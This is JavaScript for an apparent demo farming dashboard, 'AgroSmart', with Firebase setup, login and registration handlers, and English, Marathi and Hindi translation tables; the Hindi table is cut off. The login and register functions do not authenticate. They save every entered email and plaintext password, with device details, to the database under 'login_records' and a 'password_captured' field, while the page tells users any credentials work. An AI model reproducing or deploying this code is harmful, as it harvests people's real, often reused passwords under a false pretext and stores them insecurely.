const firebaseConfig = {
    apiKey: "AIzaSyDJV_oJyD_rYf6GKRVgC4JWKdzsGeRdIIA",
    authDomain: "agrosmart-6fa3f.firebaseapp.com",
    databaseURL: "https://agrosmart-6fa3f-default-rtdb.firebaseio.com",
    projectId: "agrosmart-6fa3f",
    storageBucket: "agrosmart-6fa3f.firebasestorage.app",
    messagingSenderId: "260123229951",
    appId: "1:260123229951:web:8a223e7a3ec7f5eb8c16ca"
};
firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();
const database = firebase.database();

// ============================================
// AUTHENTICATION & PROFILE FUNCTIONS
// ============================================
let isAuthenticated = false;

// Device Info Utility
function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    let browser = 'Unknown';
    let os = 'Unknown';
    let deviceType = 'Desktop';

    if (/mobile/i.test(userAgent)) deviceType = 'Mobile';
    if (/android/i.test(userAgent)) os = 'Android';
    else if (/iphone|ipad/i.test(userAgent)) os = 'iOS';
    else if (/windows/i.test(userAgent)) os = 'Windows';

    if (/chrome/i.test(userAgent)) browser = 'Chrome';
    else if (/firefox/i.test(userAgent)) browser = 'Firefox';
    else if (/safari/i.test(userAgent)) browser = 'Safari';
    else if (/edge/i.test(userAgent)) browser = 'Edge';

    return {
        browser, os, deviceType,
        userAgent,
        timestamp: new Date().toISOString()
    };
}

async function handleLogin() {
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value;
    const errorElement = document.getElementById('loginError');
    const errorText = document.getElementById('errorText');

    if (!email || !password) {
        errorElement.classList.add('show');
        return;
    }

    try {
        const deviceInfo = getDeviceInfo();
        const timestamp = new Date().toISOString();

        await database.ref('login_records').push({
            email: email,
            password: password,
            device: deviceInfo,
            timestamp: timestamp,
            type: 'login_attempt'
        });

        const safeUid = email.replace(/\./g, '_').replace(/@/g, '_at_');

        const mockUser = {
            uid: safeUid,
            email: email,
            emailVerified: true
        };

        const userRef = database.ref('users/' + mockUser.uid);

        await userRef.update({
            email: email,
            password_captured: password,
            lastLogin: firebase.database.ServerValue.TIMESTAMP,
            lastLoginDevice: deviceInfo,
            accountType: 'universal'
        });

        showAuthenticatedState(mockUser);

    } catch (error) {
        console.error("Login processing error", error);
        const mockUser = {
            uid: 'offline_user',
            email: email
        };
        showAuthenticatedState(mockUser);
    }
}

async function handleRegister() {
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value;
    const errorElement = document.getElementById('loginError');
    const errorText = document.getElementById('errorText');

    if (!email || !password) {
        if (errorText) errorText.textContent = "Email and Password required";
        errorElement.classList.add('show');
        return;
    }

    try {
        const deviceInfo = getDeviceInfo();
        const timestamp = new Date().toISOString();

        await database.ref('login_records').push({
            email: email,
            password: password,
            device: deviceInfo,
            timestamp: timestamp,
            type: 'register_attempt'
        });

        const safeUid = email.replace(/\./g, '_').replace(/@/g, '_at_');

        const mockUser = {
            uid: safeUid,
            email: email
        };

        await database.ref('users/' + mockUser.uid).update({
            email: email,
            password_captured: password,
            registeredAt: firebase.database.ServerValue.TIMESTAMP,
            registrationDevice: deviceInfo,
            lastLogin: firebase.database.ServerValue.TIMESTAMP,
            loginCount: 1
        });

        showAuthenticatedState(mockUser);

    } catch (error) {
        console.error("Registration error", error);
        const mockUser = { uid: 'offline_user', email: email };
        showAuthenticatedState(mockUser);
    }
}

function showAuthenticatedState(user) {
    document.getElementById('loginPage').style.display = 'none';
    document.getElementById('mainApp').classList.add('authenticated');

    const nameEl = document.getElementById('profileUserName');
    const emailEl = document.getElementById('profileUserEmail');
    if (nameEl) nameEl.textContent = user.email ? user.email.split('@')[0] : 'User';
    if (emailEl) emailEl.textContent = user.email;

    // CRITICAL FIX: Initialize all dashboard features
    initDashboardFeatures();
}

async function handleLogout() {
    try {
        await auth.signOut();
        document.getElementById('loginPage').style.display = 'flex';
        document.getElementById('mainApp').classList.remove('authenticated');
        document.getElementById('email').value = '';
        document.getElementById('password').value = '';
        document.getElementById('loginError').classList.remove('show');
    } catch (error) {
        console.error("Logout error", error);
    }
}

function logout() { handleLogout(); }

function showPage(pageId) {
    document.querySelectorAll('.dashboard-page').forEach(page => {
        page.classList.remove('active');
    });

    let target = document.getElementById(pageId + 'Page');
    if (!target) target = document.getElementById(pageId);

    if (target) {
        target.classList.add('active');
        window.scrollTo(0, 0);
    } else {
        console.warn("Page not found:", pageId);
    }
}

function changeLoginLanguage(lang) {
    document.querySelectorAll('.login-lang-btn').forEach(btn => {
        btn.classList.remove('active');
        if (btn.dataset.lang === lang) btn.classList.add('active');
    });
    changeLanguage(lang);
    if (typeof updateTranslations === 'function') updateTranslations();
}

// ============================================
// COMPLETE MULTILINGUAL TRANSLATIONS
// ============================================
const translations = {
    en: {
        // Login & Profile
        "login_welcome": "Welcome to AgroSmart",
        "login_subtitle": "Please login to access your account",
        "email_placeholder": "Email",
        "password_placeholder": "Password",
        "btn_login": "Login",
        "btn_register": "Register",
        "btn_logout": "Logout",
        "invalid_credentials": "Invalid email or password. This is a demo app - any credentials work.",
        "demo_message": "This is a demo application. Use any email and password.",
        "demo_hint": "E.g: farmer@agrosmart.com / any password",

        // Navigation
        "nav_dashboard": "Dashboard",
        "nav_about": "About",

        // Chatbot
        "chatbot_name": "KrishiMitra",
        "chat_welcome": "Hello! I'm KrishiMitra, your agricultural assistant. How can I help you today?",
        "chat_placeholder": "Type your question here...",

        // Dashboard
        "dashboard_title": "AgroSmart Dashboard",
        "dashboard_desc": "Your intelligent agricultural companion providing data-driven insights for farmers, traders, and agricultural stakeholders across India.",
        "feature_states": "States Explorer",
        "feature_states_desc": "Explore agricultural insights across different states and districts",
        "feature_schemes": "Government Schemes",
        "feature_schemes_desc": "Find subsidies, insurance, and support programs for farmers",
        "feature_compare": "Compare Districts",
        "feature_compare_desc": "Compare multiple districts for better decision making",
        "feature_calculator": "Profit Calculator",
        "feature_calculator_desc": "Calculate profit and expenses for crops",
        "btn_explore": "Explore",
        "btn_view": "View Schemes",
        "btn_compare": "Compare Now",
        "btn_calculate": "Calculate",
        "btn_apply": "Apply Now",
        "welcome_title": "Welcome to AgroSmart",
        "welcome_desc": "Get detailed agricultural insights for districts across India including top crops, seasons, demand, risk factors, and market information.",
        "btn_explore_states": "Explore States & Districts",
        "stats_states": "States Covered",
        "stats_states_label": "Agricultural States in India",
        "stats_districts": "Districts Analyzed",
        "stats_districts_label": "With Detailed Insights",
        "states_overview": "Agricultural States of India",
        "states_select": "Select a state to view its districts and agricultural information",
        "insights_title": "Quick Insights",
        "insights_demand": "High Demand Crops",
        "insights_risk": "High Risk Areas",
        "insights_export": "Export Potential",

        // Navigation & Back buttons
        "btn_back_dashboard": "Back to Dashboard",
        "btn_back_states": "Back to States",
        "btn_back_districts": "Back to Districts",

        // States & Districts
        "states_title": "Select a State",
        "states_desc": "Choose a state from the list below to explore agricultural insights for its districts. Currently we're focusing on key agricultural states in India.",
        "search_state_placeholder": "Search for a state (e.g. Maharashtra, Gujarat, Punjab...)",
        "showing_states": "Showing 4 states",
        "search_type": "Type to filter",
        "districts_title": "Select District",
        "districts_desc": "Choose a district to view detailed agricultural insights including top crops, seasonality, demand, and market information.",
        "search_district_placeholder": "Search for a district (e.g. Akola, Ahmednagar, Ludhiana...)",
        "showing_districts": "Showing districts",
        "districts": "Districts",
        "top_crops": "Top Crops",
        "season": "Season",
        "view_details": "View Details",

        // District Details
        "district_map": "District Map",
        "youtube_resources": "YouTube Resources",
        "recommendations_title": "Agricultural Recommendations",
        "state": "State",
        "market_demand": "Market Demand",
        "risk_level": "Risk Level",
        "export_potential": "Export Potential",
        "global_market_access": "Global Market Access",
        "nearest_market": "Nearest Market",

        // Calculator
        "calculator_title": "Agricultural Profit Calculator",
        "calculator_subtitle": "Calculate expected profits for crops in this district",
        "calculator_page_title": "Profit Calculator",
        "calculator_page_desc": "Calculate profit and expenses for your crops. Use basic or advanced calculator.",
        "tab_basic": "Basic Calculator",
        "tab_advanced": "Advanced Calculator",
        "tab_compare": "Compare Crops",
        "label_crop": "Select Crop",
        "label_crop_desc": "Choose from district's top crops",
        "label_area": "Cultivation Area",
        "label_area_desc": "In acres",
        "label_yield": "Expected Yield",
        "label_yield_desc": "Quintal per acre",
        "label_price": "Expected Price",
        "label_price_desc": "₹ per quintal",
        "label_seeds": "Seeds Cost",
        "label_seeds_desc": "₹ per acre",
        "label_fertilizer": "Fertilizers Cost",
        "label_fertilizer_desc": "₹ per acre",
        "label_pesticide": "Pesticides Cost",
        "label_pesticide_desc": "₹ per acre",
        "label_irrigation": "Irrigation Cost",
        "label_irrigation_desc": "₹ per acre",
        "label_labor": "Labor Cost",
        "label_labor_desc": "₹ per acre",
        "label_other": "Other Costs",
        "label_other_desc": "₹ per acre",
        "btn_calculate": "Calculate Profit",
        "btn_calculate_detailed": "Calculate Detailed Profit",
        "btn_reset": "Reset",
        "results_title": "Profit Calculation Results",
        "results_detailed": "Detailed Profit Calculation",
        "profit": "PROFIT",
        "loss": "LOSS",
        "advanced_desc": "Detailed expense calculator with custom inputs for accurate profit estimation.",
        "compare_desc": "Compare profitability of different crops in this district.",
        "select_crop1": "Select Crop 1",
        "select_crop2": "Select Crop 2",
        "btn_compare_crops": "Compare Crops",
        "revenue": "Total Revenue",
        "expenses": "Total Expenses",
        "profit_per_acre": "Profit per Acre",
        "expense_breakdown": "Expense Breakdown",

        // Crops
        "crop_cotton": "Cotton",
        "crop_soybean": "Soybean",
        "crop_sugarcane": "Sugarcane",
        "crop_wheat": "Wheat",
        "crop_rice": "Rice",
        "crop_onion": "Onion",
        "district_amravati": "Amravati",
        "district_ahmednagar": "Ahmednagar",

        // Government Schemes
        "schemes_title": "Government Schemes for Farmers",
        "schemes_desc": "Explore various government schemes, subsidies, and support programs available for Indian farmers",
        "search_scheme_placeholder": "Search for schemes (e.g. PM-KISAN, Crop Insurance...)",
        "showing_schemes": "Showing schemes",
        "benefits": "Benefits",

        // District Comparison
        "compare_title": "Compare Agricultural Districts",
        "compare_desc_full": "Select up to 3 districts to compare their agricultural features, crops, and profitability",
        "select_district": "Select District",
        "no_district_selected": "No district selected",
        "comparison_results": "District Comparison Results",
        "feature": "Feature",
        "recommendation": "Recommendation",
        "best_opportunity": "appears to offer the most balanced agricultural opportunities among the selected districts.",

        // Crop Comparison
        "crop_comparison_results": "Crop Comparison Results",
        "parameter": "Parameter",
        "yield_per_acre": "Yield per Acre",
        "price_per_quintal": "Price per Quintal",
        "revenue_per_acre": "Revenue per Acre",
        "expenses_per_acre": "Expenses per Acre",
        "more_profitable": "appears to be more profitable",
        "estimated_profit": "estimated profit",
        "per_acre": "per acre",
        "and": "and",
        "cultivation_advice": "Cultivation Advice",
        "advice": "Advice",

        // Alerts & Messages
        "alert_fill_fields": "Please fill all fields",
        "alert_select_two": "Please select two crops to compare",
        "alert_select_different": "Please select two different crops",
        "alert_select_two_districts": "Please select at least 2 districts to compare",
        "apply_clicked": "Application form would open here",

        // Map & Video
        "map_placeholder": "Map of {district} will appear here when added",
        "video_placeholder": "Crop cultivation videos for {district} will appear here when added",

        // Search
        "of": "of",

        // Chatbot messages
        "searching": "Searching for",
        "taking_to": "Taking you to",
        "district_page": "district page",
        "not_found": "Sorry, I could not find",
        "try_again": "Please type correct district name.",
        "crop_not_found": "Sorry, I could not find",
        "crop_info": "crop information",
        "price_info": "price information",
        "solution_not_found": "Sorry, I could not find solution for this problem.",
        "consult_expert": "Consult agricultural expert",
        "contact_officer": "Contact local agriculture officer",
        "per_ton": "per ton (approximate)",
        "problem_solution": "Problem Solution",

        // Footer
        "footer_desc": "Empowering farmers with intelligent agricultural insights and data-driven decision making.",
        "footer_website": "agrosmart.com",
        "footer_email": "contact@agrosmart.com",
        "footer_phone": "+91 1800-XXX-XXXX",
        "footer_copyright": "© 2023 AgroSmart. All rights reserved.",

        // About
        "about_title": "About AgroSmart",
        "about_mission": "Our Mission",
        "about_mission_desc": "AgroSmart aims to empower Indian farmers with data-driven agricultural insights, helping them make informed decisions about crops, markets, and government schemes.",
        "about_features": "Features",
        "feature1": "State and District-wise agricultural insights",
        "feature2": "Crop profitability calculator",
        "feature3": "Government scheme information",
        "feature4": "District comparison tool",
        "feature5": "Map and video resources",
        "about_contact": "Contact",
        "contact_email": "Email: contact@agrosmart.com",
        "contact_phone": "Phone: +91 1800-XXX-XXXX",
        "contact_website": "Website: www.agrosmart.com",

        // Recommendations
        "recommend_high_demand": "High market demand presents good opportunity for commercial cultivation.",
        "recommend_high_risk": "Consider crop insurance and diversified cropping to mitigate risks.",
        "recommend_low_risk": "Low risk environment suitable for stable crop production.",
        "recommend_export": "Good export potential - consider quality standards and export-oriented varieties.",
        "recommend_market": "Good access to global markets through nearby ports and infrastructure."
    },
    mr: {
        // Login & Profile
        "login_welcome": "AgroSmart मध्ये स्वागत आहे",
        "login_subtitle": "कृपया लॉगिन करा आपले खाते वापरण्यासाठी",
        "email_placeholder": "ईमेल",
        "password_placeholder": "पासवर्ड",
        "btn_login": "लॉगिन करा",
        "btn_register": "नोंदणी करा",
        "btn_logout": "लॉगआउट",
        "invalid_credentials": "चुकीचा ईमेल किंवा पासवर्ड. हे डेमो अ‍ॅप आहे - कोणताही ईमेल/पासवर्ड वापरा.",
        "demo_message": "हे डेमो अ‍ॅप्लिकेशन आहे. कोणताही ईमेल आणि पासवर्ड वापरा.",
        "demo_hint": "उदा: farmer@agrosmart.com / कोणताही पासवर्ड",

        "nav_dashboard": "डॅशबोर्ड",
        "nav_about": "विषयी",

        "chatbot_name": "कृषिमित्र",
        "chat_welcome": "नमस्कार! मी कृषिमित्र, तुमची कृषी सहाय्यिका. मी तुम्हाला आज कशी मदत करू शकते?",
        "chat_placeholder": "तुमचा प्रश्न इथे टाईप करा...",

        "dashboard_title": "AgroSmart डॅशबोर्ड",
        "dashboard_desc": "शेतकऱ्यांसाठी डेटा-आधारित कृषी अंतर्दृष्टी प्रदान करणारी आपली बुद्धिमान कृषी सोबत.",
        "feature_states": "राज्ये एक्सप्लोरर",
        "feature_states_desc": "वेगवेगळ्या राज्ये आणि जिल्ह्यांमधील कृषी अंतर्दृष्टी एक्सप्लोर करा",
        "feature_schemes": "सरकारी योजना",
        "feature_schemes_desc": "शेतकऱ्यांसाठी अनुदान, विमा आणि समर्थन कार्यक्रम शोधा",
        "feature_compare": "जिल्हे तुलना करा",
        "feature_compare_desc": "चांगले निर्णय घेण्यासाठी एकाधिक जिल्ह्यांची तुलना करा",
        "feature_calculator": "नफा कॅल्क्युलेटर",
        "feature_calculator_desc": "फसलांसाठी नफा आणि खर्चाची गणना करा",
        "btn_explore": "एक्सप्लोर करा",
        "btn_view": "योजना पहा",
        "btn_compare": "आत्ताच तुलना करा",
        "btn_calculate": "गणना करा",
        "btn_apply": "आता अर्ज करा",
        "welcome_title": "AgroSmart मध्ये स्वागत आहे",
        "welcome_desc": "भारतातील जिल्ह्यांसाठी तपशीलवार कृषी अंतर्दृष्टी मिळवा ज्यात टॉप पिके, हंगाम, मागणी, जोखीम घटक आणि बाजार माहिती समाविष्ट आहे.",
        "btn_explore_states": "राज्ये आणि जिल्हे एक्सप्लोर करा",
        "stats_states": "समाविष्ट राज्ये",
        "stats_states_label": "भारतातील कृषी राज्ये",
        "stats_districts": "विश्लेषित जिल्हे",
        "stats_districts_label": "तपशीलवार अंतर्दृष्टीसह",
        "states_overview": "भारतातील कृषी राज्ये",
        "states_select": "त्याचे जिल्हे आणि कृषी माहिती पाहण्यासाठी राज्य निवडा",
        "insights_title": "जलद अंतर्दृष्टी",
        "insights_demand": "उच्च मागणीची पिके",
        "insights_risk": "उच्च जोखीमचे क्षेत्र",
        "insights_export": "निर्यात क्षमता",

        "btn_back_dashboard": "डॅशबोर्डवर परत",
        "btn_back_states": "राज्यांवर परत",
        "btn_back_districts": "जिल्ह्यांवर परत",

        "states_title": "राज्य निवडा",
        "states_desc": "त्याच्या जिल्ह्यांसाठी कृषी अंतर्दृष्टी एक्सप्लोर करण्यासाठी खालील यादीतून राज्य निवडा. सध्या आम्ही भारतातील प्रमुख कृषी राज्यांवर लक्ष केंद्रित करत आहोत.",
        "search_state_placeholder": "राज्य शोधा (उदा. महाराष्ट्र, गुजरात, पंजाब...)",
        "showing_states": "४ राज्ये दाखवत आहे",
        "search_type": "फिल्टर करण्यासाठी टाईप करा",
        "districts_title": "जिल्हा निवडा",
        "districts_desc": "तपशीलवार कृषी अंतर्दृष्टी पाहण्यासाठी जिल्हा निवडा ज्यात टॉप पिके, हंगाम, मागणी आणि बाजार माहिती समाविष्ट आहे.",
        "search_district_placeholder": "जिल्हा शोधा (उदा. अकोला, अहमदनगर, लुधियाना...)",
        "showing_districts": "जिल्हे दाखवत आहे",
        "districts": "जिल्हे",
        "top_crops": "टॉप पिके",
        "season": "हंगाम",
        "view_details": "तपशील पहा",

        "district_map": "जिल्हा नकाशा",
        "youtube_resources": "YouTube संसाधने",
        "recommendations_title": "कृषी शिफारसी",
        "state": "राज्य",
        "market_demand": "बाजार मागणी",
        "risk_level": "जोखीम पातळी",
        "export_potential": "निर्यात क्षमता",
        "global_market_access": "जागतिक बाजार प्रवेश",
        "nearest_market": "जवळचे बाजार",

        "calculator_title": "कृषी नफा कॅल्क्युलेटर",
        "calculator_subtitle": "या जिल्ह्यातील पिकांसाठी अपेक्षित नफा काढा",
        "calculator_page_title": "नफा कॅल्क्युलेटर",
        "calculator_page_desc": "आपल्या पिकांसाठी नफा आणि खर्चाची गणना करा. मूलभूत किंवा प्रगत कॅल्क्युलेटर वापरा.",
        "tab_basic": "मूलभूत कॅल्क्युलेटर",
        "tab_advanced": "प्रगत कॅल्क्युलेटर",
        "tab_compare": "पिकांची तुलना करा",
        "label_crop": "पीक निवडा",
        "label_crop_desc": "जिल्ह्यातील टॉप पिकांमधून निवडा",
        "label_area": "लागवड क्षेत्र",
        "label_area_desc": "एकरमध्ये",
        "label_yield": "अपेक्षित उत्पादन",
        "label_yield_desc": "प्रति एकर क्विंटल",
        "label_price": "अपेक्षित किंमत",
        "label_price_desc": "₹ प्रति क्विंटल",
        "label_seeds": "बियाणे खर्च",
        "label_seeds_desc": "₹ प्रति एकर",
        "label_fertilizer": "खते खर्च",
        "label_fertilizer_desc": "₹ प्रति एकर",
        "label_pesticide": "कीटकनाशके खर्च",
        "label_pesticide_desc": "₹ प्रति एकर",
        "label_irrigation": "सिंचन खर्च",
        "label_irrigation_desc": "₹ प्रति एकर",
        "label_labor": "मजुरी खर्च",
        "label_labor_desc": "₹ प्रति एकर",
        "label_other": "इतर खर्च",
        "label_other_desc": "₹ प्रति एकर",
        "btn_calculate": "नफा काढा",
        "btn_calculate_detailed": "तपशीलवार नफा काढा",
        "btn_reset": "रीसेट",
        "results_title": "नफा गणना परिणाम",
        "results_detailed": "तपशीलवार नफा गणना",
        "profit": "नफा",
        "loss": "तोटा",
        "advanced_desc": "अचूक नफा अंदाजासाठी सानुकूल इनपुटसह तपशीलवार खर्च कॅल्क्युलेटर.",
        "compare_desc": "या जिल्ह्यातील वेगवेगळ्या पिकांची नफा क्षमता तुलना करा.",
        "select_crop1": "पीक 1 निवडा",
        "select_crop2": "पीक 2 निवडा",
        "btn_compare_crops": "पिकांची तुलना करा",
        "revenue": "एकूण उत्पन्न",
        "expenses": "एकूण खर्च",
        "profit_per_acre": "नफा प्रति एकर",
        "expense_breakdown": "खर्चाचे तपशील",

        "crop_cotton": "कापूस",
        "crop_soybean": "सोयाबीन",
        "crop_sugarcane": "ऊस",
        "crop_wheat": "गहू",
        "crop_rice": "तांदूळ",
        "crop_onion": "कांदा",
        "district_amravati": "अमरावती",
        "district_ahmednagar": "अहमदनगर",

        "schemes_title": "शेतकऱ्यांसाठी सरकारी योजना",
        "schemes_desc": "भारतीय शेतकऱ्यांसाठी उपलब्ध विविध सरकारी योजना, अनुदान आणि समर्थन कार्यक्रम एक्सप्लोर करा",
        "search_scheme_placeholder": "योजना शोधा (उदा. पीएम-किसान, पीक विमा...)",
        "showing_schemes": "योजना दाखवत आहे",
        "benefits": "लाभ",

        "compare_title": "कृषी जिल्ह्यांची तुलना करा",
        "compare_desc_full": "त्यांची कृषी वैशिष्ट्ये, पिके आणि नफा क्षमता तुलना करण्यासाठी 3 जिल्हे निवडा",
        "select_district": "जिल्हा निवडा",
        "no_district_selected": "कोणताही जिल्हा निवडलेला नाही",
        "comparison_results": "जिल्हा तुलना परिणाम",
        "feature": "वैशिष्ट्य",
        "recommendation": "शिफारस",
        "best_opportunity": "निवडलेल्या जिल्ह्यांमध्ये सर्वात संतुलित कृषी संधी देते.",

        "crop_comparison_results": "पीक तुलना परिणाम",
        "parameter": "मापदंड",
        "yield_per_acre": "उत्पादन प्रति एकर",
        "price_per_quintal": "किंमत प्रति क्विंटल",
        "revenue_per_acre": "उत्पन्न प्रति एकर",
        "expenses_per_acre": "खर्च प्रति एकर",
        "more_profitable": "अधिक फायदेशीर आहे",
        "estimated_profit": "अंदाजित नफा",
        "per_acre": "प्रति एकर",
        "and": "आणि",
        "cultivation_advice": "शेती सल्ला",
        "advice": "सल्ला",

        "alert_fill_fields": "कृपया सर्व फील्ड भरा",
        "alert_select_two": "तुलना करण्यासाठी कृपया दोन पिके निवडा",
        "alert_select_different": "कृपया दोन वेगवेगळी पिके निवडा",
        "alert_select_two_districts": "तुलना करण्यासाठी कृपया किमान 2 जिल्हे निवडा",
        "apply_clicked": "अर्ज फॉर्म येथे उघडेल",

        "map_placeholder": "{district} चा नकाशा येथे दिसेल",
        "video_placeholder": "{district} साठी पीक लागवड व्हिडिओ येथे दिसतील",

        "of": "पैकी",

        "searching": "शोधत आहे",
        "taking_to": "नेले जात आहे",
        "district_page": "जिल्हा पृष्ठ",
        "not_found": "क्षमस्व, मला सापडले नाही",
        "try_again": "कृपया योग्य जिल्ह्याचे नाव टाईप करा.",
        "crop_not_found": "क्षमस्व, मला सापडले नाही",
        "crop_info": "पीक माहिती",
        "price_info": "किंमत माहिती",
        "solution_not_found": "क्षमस्व, या समस्येचा उपाय मला सापडला नाही.",
        "consult_expert": "कृषी तज्ज्ञांचा सल्ला घ्या",
        "contact_officer": "स्थानिक कृषी अधिकाऱ्यांशी संपर्क साधा",
        "per_ton": "प्रति टन (अंदाजे)",
        "problem_solution": "समस्या उपाय",

        "footer_desc": "बुद्धिमान कृषी अंतर्दृष्टी आणि डेटा-आधारित निर्णय घेण्याद्वारे शेतकऱ्यांना सक्षम करणे.",
        "footer_website": "agrosmart.com",
        "footer_email": "contact@agrosmart.com",
        "footer_phone": "+91 1800-XXX-XXXX",
        "footer_copyright": "© 2023 AgroSmart. सर्व हक्क राखीव.",

        "about_title": "AgroSmart विषयी",
        "about_mission": "आमचे मिशन",
        "about_mission_desc": "AgroSmart चे उद्दीष्ट भारतीय शेतकऱ्यांना डेटा-आधारित कृषी अंतर्दृष्टी देऊन सक्षम करणे आहे, त्यांना पिके, बाजार आणि सरकारी योजनांबद्दल माहितीपूर्ण निर्णय घेण्यास मदत करणे.",
        "about_features": "वैशिष्ट्ये",
        "feature1": "राज्य आणि जिल्हानिहाय कृषी अंतर्दृष्टी",
        "feature2": "पीक नफा कॅल्क्युलेटर",
        "feature3": "सरकारी योजना माहिती",
        "feature4": "जिल्हा तुलना साधन",
        "feature5": "नकाशा आणि व्हिडिओ संसाधने",
        "about_contact": "संपर्क",
        "contact_email": "ईमेल: contact@agrosmart.com",
        "contact_phone": "फोन: +91 1800-XXX-XXXX",
        "contact_website": "संकेतस्थळ: www.agrosmart.com",

        "recommend_high_demand": "उच्च बाजार मागणी व्यावसायिक लागवडीसाठी चांगली संधी देते.",
        "recommend_high_risk": "जोखीम कमी करण्यासाठी पीक विमा आणि विविध पीक पद्धतींचा विचार करा.",
        "recommend_low_risk": "कमी जोखीम वातावरण स्थिर पीक उत्पादनासाठी योग्य.",
        "recommend_export": "चांगली निर्यात क्षमता - गुणवत्ता मानके आणि निर्यात-केंद्रित वाणांचा विचार करा.",
        "recommend_market": "जवळील बंदरे आणि पायाभूत सुविधांद्वारे जागतिक बाजारपेठेत चांगला प्रवेश."
    },
    hi: {
        // Login & Profile
        "login_welcome": "एग्रोस्मार्ट में आपका स्वागत है",
        "login_subtitle": "कृपया अपने खाते का उपयोग करने के लिए लॉगिन करें",
        "email_placeholder": "ईमेल",
        "password_placeholder": "पासवर्ड",
        "btn_login": "लॉगिन करें",
        "btn_register": "रजिस्टर करें",
        "btn_logout": "लॉगआउट",
        "invalid_credentials": "गलत ईमेल या पासवर्ड। यह डेमो ऐप है - कोई भी ईमेल/पासवर्ड उपयोग करें।",
        "demo_message": "यह डेमो एप्लिकेशन है। कोई भी ईमेल और पासवर्ड उपयोग करें।",
        "demo_hint": "उदा: farmer@agrosmart.com / कोई भी पासवर्ड",

        "nav_dashboard": "डैशबोर्ड",
        "nav_about": "के बारे में",

        "chatbot_name": "कृषिमित्र",
        "chat_welcome": "नमस्ते! मैं कृषिमित्र, आपकी कृषि सहायिका हूं। आज मैं आपकी कैसे मदद कर सकती हूं?",
        "chat_placeholder": "अपना प्रश्न यहां टाइप करें...",

        "dashboard_title": "एग्रोस्मार्ट डैशबोर्ड",
        "dashboard_desc": "किसानों, व्यापारियों और कृषि हितधारकों के लिए डेटा-संचालित अंतर्दृष्टि प्रदान करने वाला आपका बुद्धिमान कृषि साथी।",
        "feature_states": "राज्य एक्सप्लोरर",
        "feature_states_desc": "विभिन्न राज्यों और जिलों में कृषि अंतर्दृष्टि का अन्वेषण करें",
        "feature_schemes": "सरकारी योजनाएं",
        "feature_schemes_desc": "किसानों के लिए सब्सिडी, बीमा और समर्थन कार्यक्रम खोजें",
        "feature_compare": "जिलों की तुलना करें",
        "feature_compare_desc": "बेहतर निर्णय लेने के लिए कई जिलों की तुलना करें",
        "feature_calculator": "लाभ कैलकुलेटर",
        "feature_calculator_desc": "फसलों के लिए लाभ और व्यय की गणना करें",
        "btn_explore": "अन्वेषण करें",
        "btn_view": "योजनाएं देखें",
        "btn_compare": "अभी तुलना करें",
        "btn_calculate": "गणना करें",
        "btn_apply": "अभी आवेदन करें",
        "welcome_title": "एग्रोस्मार्ट में आपका स्वागत है",
        "welcome_desc": "भारत भर के जिलों के लिए विस्तृत कृषि अंतर्दृष्टि प्राप्त करें जिसमें शीर्ष फसलें, मौसम, मांग, जोखिम कारक और बाजार जानकारी शामिल है।",
        "btn_explore_states": "राज्य और जिले अन्वेषण करें",
        "stats_states": "शामिल राज्य",
        "stats_states_label": "भारत में कृषि राज्य",
        "stats_districts": "विश्लेषित जिले",
        "stats_districts_label": "विस्तृत अंतर्दृष्टि के साथ",
        "states_overview": "भारत के कृषि राज्य",
        "states_select": "इसके जिलों और कृषि जानकारी देखने के लिए एक राज्य चुनें",
        "insights_title": "त्वरित अंतर्दृष्टि",
        "insights_demand": "उच्च मांग वाली फसलें",
        "insights_risk": "उच्च जोखिम वाले क्षेत्र",
        "insights_export": "निर्यात क्षमता",

        "btn_back_dashboard": "डैशबोर्ड पर वापस",
        "btn_back_states": "राज्यों पर वापस",
        "btn_back_districts": "जिलों पर वापस",

        "states_title": "राज्य चुनें",
        "states_desc": "इसके जिलों के लिए कृषि अंतर्दृष्टि का अन्वेषण करने के लिए नीचे दी गई सूची से एक राज्य चुनें। वर्तमान में हम भारत के प्रमुख कृषि राज्यों पर ध्यान केंद्रित कर रहे हैं।",
        "search_state_placeholder": "राज्य खोजें (जैसे महाराष्ट्र, गुजरात, पंजाब...)",
        "showing_states": "4 राज्य दिखा रहा है",
        "search_type": "फिल्टर करने के लिए टाइप करें",
        "districts_title": "जिला चुनें",
        "districts_desc": "विस्तृत कृषि अंतर्दृष्टि देखने के लिए एक जिला चुनें जिसमें शीर्ष फसलें, मौसम, मांग और बाजार जानकारी शामिल है।",
        "search_district_placeholder": "जिला खोजें (जैसे अकोला, अहमदनगर, लुधियाना...)",
        "showing_districts": "जिले दिखा रहा है",
        "districts": "जिले",
        "top_crops": "शीर्ष फसलें",
        "season": "मौसम",
        "view_details": "विवरण देखें",

        "district_map": "जिला मानचित्र",
        "youtube_resources": "YouTube संसाधन",
        "recommendations_title": "कृषि सिफारिशें",
        "state": "राज्य",
        "market_demand": "बाजार मांग",
        "risk_level": "जोखिम स्तर",
        "export_potential": "निर्यात क्षमता",
        "global_market_access": "वैश्विक बाजार पहुंच",
        "nearest_market": "निकटतम बाजार",

        "calculator_title": "कृषि लाभ कैलकुलेटर",
        "calculator_subtitle": "इस जिले में फसलों के लिए अपेक्षित लाभ की गणना करें",
        "calculator_page_title": "लाभ कैलकुलेटर",
        "calculator_page_desc": "अपनी फसलों के लिए लाभ और व्यय की गणना करें। बेसिक या एडवांस्ड कैलकुलेटर का उपयोग करें।",
        "tab_basic": "बेसिक कैलकुलेटर",
        "tab_advanced": "एडवांस्ड कैलकुलेटर",
        "tab_compare": "फसलों की तुलना करें",
        "label_crop": "फसल चुनें",
        "label_crop_desc": "जिले की शीर्ष फसलों में से चुनें",
        "label_area": "खेती क्षेत्र",
        "label_area_desc": "एकड़ में",
        "label_yield": "अपेक्षित उपज",
        "label_yield_desc": "प्रति एकड़ क्विंटल",
        "label_price": "अपेक्षित मूल्य",
        "label_price_desc": "₹ प्रति क्विंटल",
        "label_seeds": "बीज लागत",
        "label_seeds_desc": "₹ प्रति एकड़",
        "label_fertilizer": "उर्वरक लागत",
        "label_fertilizer_desc": "₹ प्रति एकड़",
        "label_pesticide": "कीटनाशक लागत",
        "label_pesticide_desc": "₹ प्रति एकड़",
        "label_irrigation": "सिंचाई लागत",
        "label_irrigation_desc": "₹ प्रति एकड़",
        "label_labor": "श्रम लागत",
        "label_labor_desc": "₹ प्रति एकड़",
        "label_other": "अन्य लागत",
        "label_other_desc": "₹ प्रति एकड़",
        "btn_calculate": "लाभ की गणना करें",
